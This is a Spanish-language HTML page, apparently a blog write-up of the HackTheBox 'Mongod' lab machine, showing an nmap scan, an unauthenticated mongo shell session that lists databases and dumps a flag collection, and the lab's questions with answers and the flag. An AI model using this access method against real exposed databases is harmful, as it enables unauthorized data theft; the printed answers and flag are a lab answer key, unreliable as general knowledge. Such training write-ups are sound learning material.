@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Mongod HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/mongod.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Mongod HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Mongod de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Mongod de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Mongod HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Mongod HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Mongod de la plataforma de HackTheBox","headline":"Writeup Mongod HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Mongod HackTheBox</h1>
+          <p>Resolución de la máquina Mongod de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -sV 10.129.118.232
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux)
+27017/tcp open  mongodb MongoDB 3.6.8</span>
+</code></pre></div></div>
+
+<div><p>Podemos conectarnos con mongo en remoto y listar las bases de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ mongo </span><span class="p">mongodb://10.129.118.232:27017
+MongoDB shell version v6.0.1
+connecting to: mongodb://10.129.118.232:27017/?compressors=disabled&gssapiServiceName=mongodb
+Implicit session: session { "id" : UUID("2c27c625-c4b5-4b7c-a683-c86ad84ec324") }
+MongoDB server version: 3.6.8
+WARNING: shell and server versions do not match
+================
+Warning: the "mongo" shell has been superseded by "mongosh",
+which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
+an upcoming release.
+For installation instructions, see
+https://docs.mongodb.com/mongodb-shell/install/
+================
+---
+The server generated these startup warnings when booting: 
+2023-01-23T03:51:08.181+0000 I STORAGE  [initandlisten] 
+2023-01-23T03:51:08.181+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
+2023-01-23T03:51:08.181+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
+2023-01-23T03:51:11.303+0000 I CONTROL  [initandlisten] 
+2023-01-23T03:51:11.303+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
+2023-01-23T03:51:11.303+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
+2023-01-23T03:51:11.303+0000 I CONTROL  [initandlisten] 
+---
+</span><span class="kd">></span><span class="p"> show dbs
+admin                  0.000GB
+config                 0.000GB
+local                  0.000GB
+sensitive_information  0.000GB
+users                  0.000GB
+</span><span class="kd">></span>
+</code></pre></div></div>
+
+<div><p>Usamos la tabla sensivite_information y listamos las collection de ella</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">></span><span class="p"> use sensitive_information
+switched to db sensitive_information
+</span><span class="kd">></span><span class="p"> show collections
+flag
+</span><span class="kd">></span>
+</code></pre></div></div>
+
+<div><p>Podemos ver la flag asi que la listamos y hemos terminadoa</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">></span><span class="p"> db.flag.find().pretty()
+{
+	"_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
+	"flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
+}
+</span><span class="kd">></span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>How many TCP ports are open on the machine?</strong></li>
+<ul><p></p><li>2</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which service is running on port 27017 of the remote host?</strong></li>
+<ul><p></p><li>MongoDB 3.6.8</li></ul></blockquote><br>
+
+<blockquote><li><strong>What type of database is MongoDB? (Choose: SQL or NoSQL)</strong></li>
+<ul><p></p><li>NoSQL</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the command name for the Mongo shell that is installed with the mongodb-clients package?</strong></li>
+<ul><p></p><li>mongo</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)</strong></li>
+<ul><p></p><li>show dbs</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the command used for listing out the collections in a database? (No need to include a trailing ;)</strong></li>
+<ul><p></p><li>show collections</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?</strong></li>
+<ul><p></p><li>db.flag.find().pretty()</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>1b6e6fb359e7c40241b6d431427ba6ea</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
